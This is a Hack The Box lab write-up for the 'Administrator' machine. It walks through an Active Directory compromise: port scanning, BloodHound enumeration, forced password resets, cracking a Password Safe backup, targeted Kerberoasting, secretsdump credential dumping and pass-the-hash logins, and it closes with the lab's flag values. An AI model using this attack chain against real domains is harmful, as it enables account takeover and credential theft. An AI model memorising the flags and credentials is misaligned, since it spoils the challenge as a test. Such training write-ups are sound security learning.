+++
title = "HTB - Administrator"
date = 2026-01-16
+++

Originally Done 11/21/2024

### Scan
```
nmap -sV -sC -p- --open 10.10.11.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 19:21 EST
Nmap scan report for 10.10.11.42
Host is up (0.13s latency).
Not shown: 65507 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-22 07:22:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50160/tcp open  msrpc         Microsoft Windows RPC
59513/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59518/tcp open  msrpc         Microsoft Windows RPC
59525/tcp open  msrpc         Microsoft Windows RPC
59530/tcp open  msrpc         Microsoft Windows RPC
59543/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2024-11-22T07:23:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.69 seconds

```

### Enumeration
Assumed Breach Creds: `Olivia:ichliebedich`

445:
- SMB Shares Readable

389:
- NXC RID Users Brute

5985:
- Evil-WinRM Logon

Bloodhound to create foundational understanding of environment.
Learned something new. Queries weren't giving me lateral steps until:  Node 'First Degree Object Control'
We can modify the `michael` account to set up a Kerberoast attack. We can also reset password.
Query info by `net user michael /domain`, change by `net user michael password /domain`
Now we can migrate our session by logging in with those credentials: `evil-winrm -i 10.10.11.42 -u 'michael' -p 'password'`
If we go back to bloodhound and query the nodes and FDOC, we can see that `michael` can change `benjamin` password.
We can use RPC Client to do this: `rpcclient -U "michael" administrator.htb`, then `setuserinfo2 benjamin 23 'password'`

We can list shares with these creds, but cannot seem to eliv-winrm. Using bloodhound, it looks like he is a part of the Share Moderators group. Let's migrate and see if SMB or FTP workds.

We find backup file in FTP Share. We can use `pwsafe2john` to convert the file to a crackable hash format: `pwsafe2john Backup.psafe3 > hash.txt`
Crack as normal:`tekieromucho`
Install and use `pwsafe` to view database. Emily creds `UXLCI5iETUsIBoFVTj8yQFKoHjXmb` ! Evil-Winrm
We can try a targeted kerberos attack on `ethan`  when looking at nodes via bloodhound. Install the targetedkeberoast python tool from github if you don thave it
` python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`
we get clock skew too great. Its skewed. about 7 hours. We can sync. 
```
su
timedatectl set-ntp off
rdate -n 10.10.11.42
[Command]
```

We get the hash, serve to john for the password `limpbizkit`
Thru bloodhound, we can see Ethan has FDOC for access to DC
We can use secretsdump to get waht we need. Pass the hash!
secretsdump `python3 secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42`
`evil-winrm -i 10.10.11.42 -u 'administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'`
USER:`f38a2042c339e877195c92e690d87268`
ROOT:`44a0f25184d3574101707f9c0959559b`





